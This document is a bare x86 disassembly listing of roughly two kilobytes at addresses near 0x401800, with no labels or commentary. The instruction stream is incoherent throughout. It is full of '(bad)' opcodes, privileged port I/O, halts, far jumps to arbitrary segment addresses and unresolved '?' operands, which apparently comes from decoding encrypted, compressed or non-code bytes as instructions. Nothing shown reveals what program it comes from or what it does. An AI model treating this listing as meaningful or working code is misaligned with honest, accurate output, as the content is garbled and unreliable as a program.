  40180f:	ins    DWORD PTR es:[edi],dx
  401810:	push   esi
  401811:	jmp    0x924:0x73e6c22a
  401818:	(bad)  
  401819:	dec    esi
  40181a:	jle    0x40180b
  40181c:	pop    ebp
  40181d:	pop    ecx
  40181e:	out    0xda,al
  401820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401821:	xlat   BYTE PTR ds:[ebx]
  401822:	out    0xc6,eax
  401824:	add    bh,BYTE PTR [esi+0x757ff77f]
  40182a:	(bad)  
  40182b:	push   ecx
  40182c:	adc    bh,BYTE PTR [eax+ecx*4+0xf]
  401830:	leave  
  401831:	and    eax,0xfe320d9d
  401836:	cmp    ecx,DWORD PTR [edi]
  401838:	lock les ecx,FWORD PTR [ebp+0x59b61ac1]
  40183f:	gs cs adc edi,esi
  401843:	sbb    eax,0x475fb58e
  401848:	sbb    edi,edi
  40184a:	call   0xf819:0xd5d162db
  401851:	div    BYTE PTR [ecx-0x15]
  401854:	or     edi,esp
  401856:	dec    edx
  401857:	pop    ebx
  401858:	mov    edi,0xb72eb7d5
  40185d:	adc    al,0xf5
  40185f:	(bad)  
  401860:	out    0x58,al
  401862:	jl     0x4017e7
  401864:	shr    DWORD PTR [eiz*4-0x4d393489],cl
  40186b:	popa   
  40186c:	mov    ds:0xff3cd7b2,al
  401871:	add    DWORD PTR [ebx+0x440c6177],0x51
  401878:	push   ds
  401879:	mov    ah,0x22
  40187b:	jbe    0x401853
  40187d:	inc    ecx
  40187e:	mov    edx,0xa288099d
  401883:	imul   edi,DWORD PTR [edx+0x33],0x4e4d1681
  40188a:	mov    ebp,0xaf8c32a3
  40188f:	mov    bh,0xbe
  401891:	add    eax,0xda4972db
  401896:	ja     0x4018d0
  401898:	sub    al,0xcb
  40189a:	push   ds
  40189b:	rcl    DWORD PTR [edx],1
  40189d:	xor    DWORD PTR [esi+ebx*1-0x2529989b],eax
  4018a4:	stc    
  4018a5:	or     dl,BYTE PTR [ebp-0x5d]
  4018a8:	or     DWORD PTR [edi+0x1],ebp
  4018ab:	pusha  
  4018ac:	jne    0x401854
  4018ae:	jb     0x4018a3
  4018b0:	fs pop ss
  4018b2:	mov    DWORD PTR [si+0x13],edi
  4018b6:	shl    BYTE PTR [ecx-0xd],1
  4018b9:	out    dx,al
  4018ba:	cmp    ah,BYTE PTR [ecx-0x5f62ba53]
  4018c0:	add    ch,BYTE PTR [eax-0x65]
  4018c3:	daa    
  4018c4:	scas   al,BYTE PTR es:[edi]
  4018c5:	dec    eax
  4018c6:	pop    ebx
  4018c7:	pusha  
  4018c8:	cmp    bh,bh
  4018ca:	fmul   st,st(7)
  4018cc:	iret   
  4018cd:	jge    0x4018d7
  4018cf:	in     al,0x85
  4018d1:	test   eax,0x5bbfccfb
  4018d6:	cli    
  4018d7:	cmp    al,0x19
  4018d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018da:	sbb    BYTE PTR [esp+ebp*2],0x19
  4018de:	mov    ecx,0xb87cf1c4
  4018e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018e4:	or     ecx,DWORD PTR [ebx-0x3e]
  4018e7:	loope  0x401885
  4018e9:	dec    ebp
  4018ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4018eb:	outs   dx,BYTE PTR ds:[esi]
  4018ec:	cmp    dh,dh
  4018ee:	pop    esi
  4018ef:	sahf   
  4018f0:	sbb    ebx,esi
  4018f2:	scas   eax,DWORD PTR es:[edi]
  4018f3:	repz push esi
  4018f5:	push   ss
  4018f6:	test   al,0xe4
  4018f8:	popf   
  4018f9:	pop    ebx
  4018fa:	(bad)  
  4018fc:	bound  esi,QWORD PTR [eax]
  4018fe:	inc    eax
  4018ff:	xlat   BYTE PTR ds:[ebx]
  401900:	dec    ebx
  401901:	enter  0xf10,0x29
  401905:	sub    DWORD PTR [eax+ecx*2],edx
  401908:	ret    
  401909:	mov    dh,0xd4
  40190b:	std    
  40190c:	jg     0x401900
  40190e:	loop   0x4018f3
  401910:	mov    ecx,0x4c2304af
  401915:	adc    DWORD PTR [ebx+0x52d9c6b2],esp
  40191b:	push   ebx
  40191c:	fdivr  QWORD PTR ss:[eax+esi*4+0x1]
  401921:	outs   dx,BYTE PTR ds:[esi]
  401922:	xchg   esp,eax
  401923:	popa   
  401924:	bound  ebp,QWORD PTR [ebx+edi*4]
  401927:	lahf   
  401928:	ror    BYTE PTR ss:[ebx+eax*2],cl
  40192c:	clc    
  40192d:	test   BYTE PTR [ecx-0x6c],ch
  401930:	and    dh,BYTE PTR [edi]
  401932:	mov    ds:0xcce4cb12,al
  401937:	fidivr WORD PTR [ecx-0x7cb254c3]
  40193d:	xchg   edx,eax
  40193e:	mov    al,ds:0x5fe13ded
  401943:	mov    eax,ds:0x1ffd7544
  401948:	repnz mov bl,0x22
  40194b:	add    eax,0xfc1eae90
  401950:	sub    DWORD PTR [ebx+0x468b02cb],ebx
  401956:	push   ss
  401957:	push   esp
  401958:	xor    al,0x21
  40195a:	sbb    BYTE PTR [eax+0x5e],ah
  40195d:	or     DWORD PTR [edi+0x157e2cf5],ecx
  401963:	cmp    dh,BYTE PTR [ebx+0xcfc2fb4]
  401969:	jmp    0x3a96:0xb9ee80d4
  401970:	fbstp  TBYTE PTR [esi+0x15]
  401973:	ds ret 0x1f1f
  401977:	ret    0x29a8
  40197a:	add    al,0x66
  40197c:	ds cmc 
  40197e:	jge    0x40195e
  401980:	dec    ebx
  401981:	adc    eax,0xb6af746f
  401986:	stos   DWORD PTR es:[edi],eax
  401987:	jg     0x4019fd
  401989:	es push ss
  40198b:	jo     0x401a09
  40198d:	into   
  40198e:	mov    ebx,0x569fd959
  401993:	jnp    0x4019b8
  401995:	neg    DWORD PTR [ebp+0x58]
  401998:	fdivr  st,st(6)
  40199a:	adc    BYTE PTR ds:0x66ef9f22,bh
  4019a0:	dec    edi
  4019a1:	inc    ebx
  4019a2:	pushf  
  4019a3:	cmp    ebx,DWORD PTR [ebx+ebp*2-0x2728e1f5]
  4019aa:	test   eax,0xab6c353d
  4019af:	(bad)  
  4019b0:	int3   
  4019b1:	lds    edx,FWORD PTR [edi]
  4019b3:	fstp   QWORD PTR [edx-0x18]
  4019b6:	(bad)  
  4019b7:	in     al,0xcf
  4019b9:	mov    ds:0xf363d5bd,al
  4019be:	pop    edx
  4019bf:	push   esi
  4019c0:	das    
  4019c1:	or     dh,ah
  4019c3:	(bad)  
  4019c5:	dec    esi
  4019c6:	mov    ebx,0xa780b04a
  4019cb:	adc    al,0xcc
  4019cd:	aas    
  4019ce:	push   edi
  4019cf:	lea    eax,ds:0x7eebae4d
  4019d5:	retf   0xbb97
  4019d8:	adc    DWORD PTR [ecx-0x7e4263e9],edi
  4019de:	sub    al,dl
  4019e0:	xor    BYTE PTR [ecx-0x5b9f02bf],bl
  4019e6:	cmc    
  4019e7:	xchg   ebp,eax
  4019e8:	cld    
  4019e9:	push   ds
  4019ea:	adc    ebx,DWORD PTR [edx]
  4019ec:	or     bl,BYTE PTR [eax-0x345d976e]
  4019f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019f3:	xchg   esp,eax
  4019f4:	and    DWORD PTR [esi-0x76],0xb151aefb
  4019fb:	add    dl,dh
  4019fd:	push   ss
  4019fe:	aam    0x38
  401a00:	cmp    al,0x5d
  401a02:	aaa    
  401a03:	dec    ecx
  401a04:	xor    bh,cl
  401a06:	jnp    0x40199a
  401a08:	and    ch,BYTE PTR [ecx+0x7153e64e]
  401a0e:	(bad)  
  401a10:	js     0x4019e6
  401a12:	mov    DWORD PTR [edi-0x29dac63],esp
  401a18:	and    eax,0x5e9c2ce7
  401a1d:	fdivr  QWORD PTR [esi-0x5a]
  401a20:	and    al,0xba
  401a22:	sti    
  401a23:	ror    al,1
  401a25:	mov    ecx,0x74e8ec22
  401a2a:	pop    edi
  401a2b:	mov    eax,0xb55e31de
  401a30:	dec    DWORD PTR [eax]
  401a32:	inc    ebp
  401a33:	xor    ch,0x51
  401a36:	sbb    eax,0x7ed85c65
  401a3b:	cmp    al,0x22
  401a3d:	into   
  401a3e:	cmp    eax,0xc4094576
  401a43:	pop    ds
  401a44:	mov    edi,0xf64f05c0
  401a49:	mov    ecx,0x368eb8ef
  401a4e:	pop    edi
  401a4f:	hlt    
  401a50:	mov    edx,0x1ceb78bb
  401a55:	mov    BYTE PTR [eax+0x615fd28],dl
  401a5b:	pop    ecx
  401a5c:	cmp    ebx,0x21ee110a
  401a62:	imul   edx,DWORD PTR [edi+0x367c8671],0xb
  401a69:	loop   0x401ace
  401a6b:	ja     0x4019f6
  401a6d:	pop    ebx
  401a6e:	push   ecx
  401a6f:	cmc    
  401a70:	dec    ecx
  401a71:	fdivrp st(1),st
  401a73:	leave  
  401a74:	xchg   esp,esp
  401a76:	jo     0x401adc
  401a78:	xchg   ebp,eax
  401a79:	pop    edx
  401a7a:	mov    WORD PTR ds:0xa55777a9,es
  401a80:	(bad)  
  401a81:	fisttp QWORD PTR [edi+0x4e3a28e5]
  401a87:	cmp    bh,BYTE PTR [ebp+0x4907ee68]
  401a8d:	enter  0x7c0a,0x44
  401a91:	jo     0x401ac6
  401a93:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  401a95:	adc    ecx,esp
  401a97:	dec    eax
  401a98:	jbe    0x401b02
  401a9a:	xchg   DWORD PTR [ecx-0x4a],ebx
  401a9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a9e:	jb     0x45a3e868
  401aa4:	cmp    al,0xae
  401aa6:	bound  ebx,QWORD PTR ds:0xb25df85c
  401aac:	cmp    al,0xb5
  401aae:	fsubr  QWORD PTR [eax+esi*8]
  401ab1:	aad    0xa0
  401ab3:	pop    ebp
  401ab4:	das    
  401ab5:	jp     0x401b10
  401ab7:	in     al,dx
  401ab8:	mov    al,ds:0x75693c9b
  401abd:	xor    DWORD PTR [edi],esi
  401abf:	cmp    eax,0x6404e49f
  401ac4:	sbb    dl,BYTE PTR [esi-0xd]
  401ac7:	aad    0x2b
  401ac9:	dec    esi
  401aca:	mov    al,ds:0xa6faac82
  401acf:	mov    ebp,0x644c0766
  401ad4:	mov    ebx,0xa68b20d9
  401ad9:	lock mov DWORD PTR [bp+si-0x1c26],esp
  401adf:	xchg   ebx,eax
  401ae0:	adc    al,0x59
  401ae2:	out    0x76,al
  401ae4:	out    0x85,eax
  401ae6:	inc    ebp
  401ae7:	(bad)  
  401ae8:	pop    es
  401ae9:	xchg   DWORD PTR [eax-0x4c],ebx
  401aec:	sub    ecx,esi
  401aee:	jns    0x401b19
  401af0:	stos   BYTE PTR es:[edi],al
  401af1:	add    eax,0x6ca95a5a
  401af6:	stos   BYTE PTR es:[edi],al
  401af7:	push   cs
  401af8:	imul   eax,DWORD PTR [esi-0x4d78450f],0x24006e74
  401b02:	fs das 
  401b04:	inc    esi
  401b05:	out    dx,eax
  401b06:	loop   0x401a9c
  401b08:	ins    DWORD PTR es:[edi],dx
  401b09:	(bad)  
  401b0a:	mov    ah,0x22
  401b0c:	pop    esi
  401b0d:	stc    
  401b0e:	(bad)  
  401b0f:	xchg   edi,eax
  401b10:	dec    ecx
  401b11:	call   DWORD PTR [esp+ebx*8+0x6f]
  401b15:	pushf  
  401b16:	mov    esi,0xb581aeab
  401b1b:	std    
  401b1c:	mov    eax,ds:0xf4bc2a25
  401b21:	into   
  401b22:	or     esi,DWORD PTR [ebp+0x3]
  401b25:	add    al,BYTE PTR [eax]
  401b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b28:	cli    
  401b29:	fiadd  WORD PTR [esi+0x61]
  401b2c:	xchg   edi,eax
  401b2d:	loop   0x401b02
  401b2f:	retf   
  401b30:	xor    al,0xf6
  401b32:	jns    0x401b95
  401b34:	mov    bl,0xc3
  401b36:	add    cl,BYTE PTR [esi]
  401b38:	test   ah,bh
  401b3a:	push   esi
  401b3b:	adc    DWORD PTR [edx],edx
  401b3d:	daa    
  401b3e:	add    edi,esp
  401b40:	icebp  
  401b41:	cmp    ch,al
  401b43:	daa    
  401b44:	ds adc dh,ah
  401b47:	iret   
  401b48:	pop    eax
  401b49:	stos   DWORD PTR es:[edi],eax
  401b4a:	mov    dl,0x76
  401b4c:	mov    ecx,DWORD PTR [ebp-0x16df3a3]
  401b52:	dec    eax
  401b53:	jb     0x401b52
  401b55:	inc    ecx
  401b56:	daa    
  401b57:	ret    
  401b58:	push   esi
  401b59:	in     al,dx
  401b5a:	mov    ds:0xf08d681c,eax
  401b5f:	imul   ebp,DWORD PTR [edx-0x4b],0xd7677901
  401b66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b67:	pop    ss
  401b68:	push   esi
  401b69:	nop
  401b6a:	aam    0x1e
  401b6c:	push   ss
  401b6d:	sub    eax,0xed6f5ec5
  401b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b73:	mov    bl,0x67
  401b75:	loop   0x401b43
  401b77:	jmp    0xa0e8:0x44760720
  401b7e:	cmp    al,0xc0
  401b80:	mov    esi,0xd98b948c
  401b85:	nop
  401b86:	sub    edx,DWORD PTR ds:0xdb8946d8
  401b8c:	nop
  401b8d:	xor    BYTE PTR [edi-0x61b7a37e],dl
  401b93:	mov    esp,0x70ab9096
  401b98:	add    al,0x54
  401b9a:	imul   BYTE PTR [ebx+eax*2+0x2b0afa65]
  401ba1:	mov    ch,bl
  401ba3:	inc    ecx
  401ba4:	push   ss
  401ba5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ba6:	pop    ebx
  401ba7:	cmp    ebx,DWORD PTR [ecx-0x5f40a8a6]
  401bad:	xchg   BYTE PTR [eax],al
  401baf:	dec    ebp
  401bb0:	lock icebp 
  401bb2:	aam    0x77
  401bb4:	add    al,0x2d
  401bb6:	cld    
  401bb7:	push   0x3ed13fc3
  401bbc:	jmp    0x401be3
  401bbe:	xchg   esp,eax
  401bc0:	pusha  
  401bc1:	jo     0x401bd3
  401bc3:	mov    edx,0xfc67b156
  401bc8:	push   es
  401bc9:	mov    ebp,0xafc81575
  401bce:	push   ss
  401bcf:	push   edi
  401bd0:	push   edi
  401bd1:	jae    0x401be4
  401bd3:	cmp    ebp,eax
  401bd5:	adc    DWORD PTR [edx+0x14],eax
  401bd8:	adc    DWORD PTR [edx+0x1b9c5648],esi
  401bde:	dec    ebx
  401bdf:	fild   QWORD PTR [edx+0x20]
  401be2:	jmp    0x40da:0x9db4a4e6
  401be9:	arpl   WORD PTR [edi+0x591ea581],bx
  401bef:	idiv   DWORD PTR [esp+esi*4-0x489c4e52]
  401bf6:	addr16 xchg edi,eax
  401bf8:	pop    esi
  401bf9:	out    0xd0,al
  401bfb:	ja     0x401bb9
  401bfd:	mov    ecx,0xc3d9e151
  401c02:	ficomp WORD PTR [ecx+edx*8+0x71cf4255]
  401c09:	push   edi
  401c0a:	mov    WORD PTR [edi-0x77],?
  401c0d:	xor    al,0xa
  401c0f:	dec    ecx
  401c10:	mov    dh,0xd8
  401c12:	xchg   ebp,eax
  401c13:	aad    0x13
  401c15:	bound  ebp,QWORD PTR [eax+0x1ee452a3]
  401c1b:	stos   BYTE PTR es:[edi],al
  401c1c:	repz inc edi
  401c1e:	inc    ecx
  401c1f:	adc    edx,DWORD PTR [ecx+0x709509cd]
  401c25:	call   0x40908a85
  401c2a:	xchg   ecx,eax
  401c2b:	sti    
  401c2c:	leave  
  401c2d:	mov    cl,dh
  401c2f:	mov    esp,0xb8fb3ba0
  401c34:	xor    BYTE PTR [eax],dh
  401c36:	sub    eax,0xfe27a76f
  401c3b:	add    eax,0x39312504
  401c40:	jnp    0x401ca4
  401c42:	jb     0x401c79
  401c44:	or     esi,edx
  401c46:	dec    edi
  401c47:	inc    esi
  401c48:	jl     0x401bfd
  401c4a:	cmp    DWORD PTR ss:[ebx-0x1c],ecx
  401c4e:	sar    DWORD PTR [ecx],cl
  401c50:	inc    ebp
  401c51:	inc    eax
  401c52:	sbb    DWORD PTR [ecx-0x30],edx
  401c55:	xor    eax,0x7789bd6e
  401c5a:	hlt    
  401c5b:	adc    ecx,edx
  401c5d:	xchg   esp,eax
  401c5e:	fnsave [esi-0x38]
  401c61:	ins    DWORD PTR es:[edi],dx
  401c62:	pop    ecx
  401c63:	bound  eax,QWORD PTR [esi-0x6f5fb0a6]
  401c69:	dec    edx
  401c6a:	adc    dh,dl
  401c6c:	ret    
  401c6d:	push   ss
  401c6e:	les    esi,FWORD PTR ds:0xc1be4aa8
  401c74:	fldcw  WORD PTR ds:0xc65156c9
  401c7a:	push   0xffffffe7
  401c7c:	pop    esp
  401c7d:	or     edi,eax
  401c7f:	mov    ebx,0xeb8da48c
  401c84:	cmp    BYTE PTR [eax+ebx*8],bl
  401c87:	xor    DWORD PTR [edi],edi
  401c89:	leave  
  401c8a:	jl     0x401d06
  401c8c:	pop    edx
  401c8d:	test   DWORD PTR [ebp-0xb],0x38eb3ed9
  401c94:	adc    BYTE PTR [eax+0x5],0x68
  401c98:	loopne 0x401c25
  401c9a:	cmp    eax,0x5544a6c2
  401c9f:	in     eax,dx
  401ca0:	loop   0x401d07
  401ca2:	ret    0x98aa
  401ca5:	inc    ebx
  401ca6:	test   dh,dl
  401ca8:	jnp    0x401cb9
  401caa:	ror    BYTE PTR [edi],0x80
  401cad:	push   eax
  401cae:	mov    ds:0x19b3ada8,eax
  401cb3:	call   0xfe2f:0x5e42629b
  401cba:	in     al,dx
  401cbb:	jae    0x401d2f
  401cbd:	cmc    
  401cbe:	fcmovb st,st(7)
  401cc0:	fisubr WORD PTR [edi+0x22c3b3ab]
  401cc6:	and    ebp,DWORD PTR [edx+0x41850e54]
  401ccc:	or     eax,esp
  401cce:	test   cl,ch
  401cd0:	call   0x1f56:0x75560617
  401cd7:	mov    edi,0x7d5507c2
  401cdc:	in     al,dx
  401cdd:	ret    0x752f
  401ce0:	inc    ebp
  401ce1:	jae    0x401cf0
  401ce3:	cwde   
  401ce4:	xchg   edi,eax
  401ce5:	sub    esi,ebp
  401ce7:	outs   dx,BYTE PTR ds:[esi]
  401ce8:	shl    edx,1
  401cea:	fisttp QWORD PTR [ebp+0x4bf1ec35]
  401cf0:	ss jae 0x401d1d
  401cf3:	lea    eax,[esi-0x2f5d8f93]
  401cf9:	adc    BYTE PTR [esi-0x14],ah
  401cfc:	jl     0x401d73
  401cfe:	dec    edx
  401cff:	(bad)  
  401d00:	fs push 0x77
  401d03:	loopne 0x401cbe
  401d05:	push   es
  401d06:	cmp    ah,BYTE PTR [ebp+0x71123a63]
  401d0c:	cmp    DWORD PTR [edx],ecx
  401d0e:	pop    edx
  401d0f:	add    esi,DWORD PTR [ecx-0x56]
  401d12:	mov    WORD PTR [ebp-0x3f7d7fb1],gs
  401d18:	sbb    eax,0x4f695689
  401d1d:	lods   eax,DWORD PTR ds:[esi]
  401d1e:	dec    esp
  401d1f:	fisttp WORD PTR ds:[esi-0x2a]
  401d23:	dec    BYTE PTR [edi]
  401d25:	ja     0x401cd0
  401d27:	sar    DWORD PTR [ecx+esi*4-0x43],1
  401d2b:	inc    edx
  401d2c:	lds    esi,FWORD PTR [edi+0xe540150]
  401d32:	push   es
  401d33:	lods   eax,DWORD PTR ds:[esi]
  401d34:	pop    ebx
  401d35:	outs   dx,BYTE PTR ds:[esi]
  401d36:	leave  
  401d37:	or     eax,0x8bc67fa
  401d3c:	lods   eax,DWORD PTR ds:[esi]
  401d3d:	mov    al,ds:0x875749aa
  401d42:	out    0xb6,al
  401d44:	fucompp 
  401d46:	popf   
  401d47:	into   
  401d48:	xchg   esp,eax
  401d49:	(bad)  
  401d4a:	fdivrp st(7),st
  401d4c:	or     BYTE PTR [ebx],0x72
  401d4f:	add    dh,BYTE PTR [ecx-0x6dbece9]
  401d55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d56:	gs xchg edi,eax
  401d58:	in     eax,dx
  401d59:	jle    0x401d3c
  401d5b:	loopne 0x401cdd
  401d5d:	imul   ecx,DWORD PTR ds:0xfaffc82e,0x0
  401d64:	push   ebx
  401d65:	push   es
  401d66:	adc    al,0xa7
  401d68:	xor    edi,DWORD PTR [eax]
  401d6a:	nop
  401d6b:	cwde   
  401d6c:	or     eax,0xa1ef8b68
  401d71:	imul   ebp,ecx,0xffffff9f
  401d74:	cmp    dl,BYTE PTR [edx-0x3d6d2c33]
  401d7a:	jae    0x401dd7
  401d7c:	mov    ah,BYTE PTR [ebx+0xaa8f9e]
  401d82:	xchg   edx,eax
  401d83:	jmp    0xee78:0x2d194244
  401d8a:	inc    edi
  401d8b:	push   edi
  401d8c:	test   eax,0x402b2c97
  401d91:	xor    al,0x53
  401d93:	sbb    ebp,ebx
  401d95:	int    0xff
  401d97:	imul   edx,DWORD PTR [ecx+0x1c],0x6
  401d9b:	and    ebx,DWORD PTR [edi-0x4f]
  401d9e:	nop
  401d9f:	(bad)  
  401da1:	(bad)  
  401da2:	add    BYTE PTR [ebx-0x15],dl
  401da5:	mov    ebp,0xf85e10ca
  401daa:	out    0xd6,al
  401dac:	sbb    BYTE PTR [esi-0x588f68a8],0xc8
  401db3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401db4:	pusha  
  401db5:	leave  
  401db6:	dec    ebp
  401db7:	inc    esp
  401db8:	mov    ?,edx
  401dba:	std    
  401dbb:	push   cs
  401dbc:	fsub   st(3),st
  401dbe:	mov    BYTE PTR [edx],bh
  401dc0:	dec    ebx
  401dc1:	clc    
  401dc2:	nop
  401dc3:	xchg   edx,eax
  401dc4:	xor    BYTE PTR [esi+0x4e],dh
  401dc7:	inc    esp
  401dc8:	mov    edi,0x145c6844
  401dcd:	pop    eax
  401dce:	jg     0x401d6f
  401dd0:	std    
  401dd1:	int3   
  401dd2:	sub    al,0xb2
  401dd4:	cmp    eax,0x8f078500
  401dd9:	int    0x91
  401ddb:	cs xchg bh,ah
  401dde:	scas   al,BYTE PTR es:[edi]
  401ddf:	jge    0x401e5d
  401de1:	(bad)  [edx-0x16653593]
  401de7:	add    DWORD PTR [ecx+0x3d8e6760],0xd12ba37c
  401df1:	pop    ebp
  401df2:	mov    esp,0xf94ca115
  401df7:	sub    al,0xbc
  401df9:	mov    dh,ch
  401dfb:	inc    eax
  401dfc:	into   
  401dfd:	out    dx,al
  401dfe:	xor    eax,0x9beb3c9a
  401e03:	mov    ds:0xb8e42b0d,al
  401e08:	sbb    ebx,DWORD PTR [eax-0x29]
  401e0b:	daa    
  401e0c:	(bad)  
  401e0d:	neg    BYTE PTR [edi-0x5c]
  401e10:	ds mov cl,0x52
  401e13:	dec    eax
  401e14:	cmp    al,0xd0
  401e16:	mov    bh,dl
  401e18:	xchg   esi,eax
  401e19:	adc    al,0x7
  401e1b:	(bad)  
  401e1c:	arpl   sp,di
  401e1e:	inc    ebp
  401e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e20:	adc    ax,0x2190
  401e24:	sbb    edi,DWORD PTR [edi+0x417e7ff9]
  401e2a:	sbb    dl,cl
  401e2c:	mov    es,ecx
  401e2e:	scas   al,BYTE PTR es:[edi]
  401e2f:	inc    ebx
  401e30:	jns    0x401ea8
  401e32:	adc    edx,DWORD PTR ds:0xa95af185
  401e38:	inc    edx
  401e39:	push   ebx
  401e3a:	mov    eax,0xb60e6496
  401e3f:	jge    0x401e64
  401e41:	jno    0x401e1f
  401e43:	xchg   esp,eax
  401e44:	xchg   edx,eax
  401e45:	nop
  401e46:	dec    ebp
  401e47:	sbb    ah,BYTE PTR [eax+edi*2+0x13931007]
  401e4e:	(bad)  
  401e50:	neg    BYTE PTR [edi+esi*4+0x496d328f]
  401e57:	ins    BYTE PTR es:[edi],dx
  401e58:	push   eax
  401e59:	ror    BYTE PTR [esi],1
  401e5b:	jne    0x401e3f
  401e5d:	mov    ds:0xd04dd5b6,al
  401e62:	jmp    0xaf2e4bfd
  401e67:	ins    DWORD PTR es:[edi],dx
  401e68:	rcr    esp,0xf4
  401e6b:	loope  0x401e09
  401e6d:	sbb    esp,0xffffff9e
  401e70:	jae    0x401e13
  401e72:	adc    BYTE PTR [edi],bh
  401e74:	enter  0x938d,0x77
  401e78:	sar    DWORD PTR [esi],0x80
  401e7b:	pop    ebx
  401e7c:	or     BYTE PTR [ecx-0x77b8e3ba],0x1c
  401e83:	xor    ecx,DWORD PTR [ebp-0x6e]
  401e86:	dec    ecx
  401e87:	int    0x87
  401e89:	xor    ebp,ecx
  401e8b:	mov    dh,0x4d
  401e8d:	imul   esp,DWORD PTR [esi*2+0x23f447c8],0xffffffb2
  401e95:	sbb    cl,bl
  401e97:	push   ss
  401e98:	daa    
  401e99:	imul   ecx,DWORD PTR [ebx+edx*4],0x93095e3d
  401ea0:	sar    BYTE PTR [edx-0x51],1
  401ea3:	adc    ch,BYTE PTR [ebp-0x6]
  401ea6:	sbb    esp,DWORD PTR [esp+ecx*4]
  401ea9:	xor    DWORD PTR es:[ecx*1-0x35722f5c],ecx
  401eb1:	jl     0x401e6c
  401eb3:	mov    ds,eax
  401eb5:	push   ds
  401eb6:	pop    ecx
  401eb7:	sub    DWORD PTR [edx],esp
  401eb9:	xchg   esp,eax
  401eba:	pushf  
  401ebb:	pop    ebp
  401ebc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401ebd:	mov    cs,WORD PTR [ebx+0x2007bdb0]
  401ec3:	sbb    esi,DWORD PTR [ecx]
  401ec5:	adc    edx,DWORD PTR [edi]
  401ec7:	cli    
  401ec8:	jnp    0x401e8f
  401eca:	push   ss
  401ecb:	sbb    eax,0xbfcea821
  401ed0:	add    DWORD PTR [edi+0x1e3ef280],ecx
  401ed6:	pop    ebx
  401ed7:	dec    edi
  401ed8:	mov    cl,0x4d
  401eda:	inc    ebx
  401edb:	lods   al,BYTE PTR ds:[esi]
  401edc:	and    edx,esi
  401ede:	pop    esp
  401edf:	sbb    ch,BYTE PTR [ecx]
  401ee1:	xchg   ecx,eax
  401ee2:	sbb    al,0xe4
  401ee4:	ins    DWORD PTR es:[edi],dx
  401ee5:	mov    BYTE PTR [edi+0x68],bl
  401ee8:	sub    edx,DWORD PTR [esi+0x2b8b224e]
  401eee:	adc    BYTE PTR [edx],ch
  401ef0:	mov    edi,DWORD PTR [edi]
  401ef2:	mov    ecx,0x857e2ba7
  401ef7:	leave  
  401ef8:	ficomp DWORD PTR [edi-0x13]
  401efb:	lds    ebx,FWORD PTR [ecx-0x5c]
  401efe:	or     ebp,eax
  401f00:	or     ebx,DWORD PTR [edi]
  401f02:	pop    es
  401f03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f04:	inc    esi
  401f05:	cmp    DWORD PTR [edi+edx*8-0xb3df2e1],ebp
  401f0c:	inc    eax
  401f0d:	pop    ss
  401f0e:	xchg   edi,eax
  401f0f:	leave  
  401f10:	jmp    0x401f35
  401f12:	and    BYTE PTR [ebx],bl
  401f14:	xor    DWORD PTR [ecx+0x779a988d],0xffffffcd
  401f1b:	setl   BYTE PTR [eax-0x51]
  401f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f20:	mov    ebp,0x4b242f84
  401f25:	inc    esp
  401f26:	xor    al,0x24
  401f28:	mov    al,0x4f
  401f2a:	int    0x4c
  401f2c:	inc    ebp
  401f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f2e:	ficom  WORD PTR [ecx-0x15]
  401f31:	fisub  DWORD PTR [ebx+ebp*4-0x27b886b2]
  401f38:	or     al,0xbf
  401f3a:	and    edx,DWORD PTR [esi]
  401f3c:	call   0xbfe2:0xe830d29
  401f43:	xor    BYTE PTR [edi],0x1b
  401f46:	js     0x401ed7
  401f48:	ins    BYTE PTR es:[edi],dx
  401f49:	mov    eax,0x5a2f0173
  401f4e:	xchg   ebx,eax
  401f4f:	mov    esi,0xf3aec8de
  401f54:	cmp    bl,BYTE PTR [ebx+eax*4]
  401f57:	shl    DWORD PTR [esp+ebp*8+0x8],cl
  401f5b:	xchg   ecx,eax
  401f5c:	ins    BYTE PTR es:[edi],dx
  401f5d:	int    0x6c
  401f5f:	pop    edx
  401f60:	adc    DWORD PTR [ebx],ebx
  401f62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f63:	push   ebx
  401f64:	or     eax,0xeffc5b19
  401f69:	sbb    dl,ah
  401f6b:	mov    ebp,0xe6d2e82f
  401f70:	cli    
  401f71:	mov    dl,BYTE PTR [edi+0x7586e08f]
  401f77:	mov    dl,0xc9
  401f79:	lahf   
  401f7a:	cs mov ah,0xc5
  401f7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f7f:	xchg   ecx,eax
  401f80:	add    al,0xf2
  401f82:	data16 lods al,BYTE PTR ds:[esi]
  401f84:	mov    ds:0xe1594eb7,al
  401f89:	dec    esp
  401f8a:	and    DWORD PTR [edx+0x1ee00cc2],esp
  401f90:	dec    eax
  401f91:	retf   0xc0c0
  401f94:	(bad)  
  401f95:	pop    esp
  401f96:	aam    0xbe
  401f98:	add    bl,BYTE PTR [eax]
  401f9a:	fistp  QWORD PTR [ecx*8+0x4cd9c6b0]
  401fa1:	shl    DWORD PTR [ebx+ebp*1],1
  401fa4:	cmp    eax,0x3433509e
  401fa9:	fs dec eax
  401fab:	add    edx,DWORD PTR [eax-0x7d]
  401fae:	imul   ebp,DWORD PTR [ebx-0x69],0xadfbe810
  401fb5:	add    edi,DWORD PTR [edi+0x754b152f]
  401fbb:	inc    esp
  401fbc:	stc    
  401fbd:	or     eax,edi
  401fbf:	test   ebx,ecx
  401fc1:	pusha  
  401fc2:	mov    ebp,0x74c15cb3
